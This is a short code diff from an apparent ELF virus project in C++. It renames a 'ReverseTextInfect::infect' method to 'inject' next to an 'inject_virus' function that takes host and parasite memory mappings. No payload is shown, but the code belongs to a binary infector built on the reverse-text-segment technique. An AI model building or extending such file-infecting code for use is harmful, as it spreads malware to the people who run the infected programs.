@@ -202,7 +202,7 @@ size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
 
 }  // namespace
 
-bool ReverseTextInfect::infect(
+bool ReverseTextInfect::inject(
     vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
     vt::common::Mmap<PROT_READ> parasite_mapping) {
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
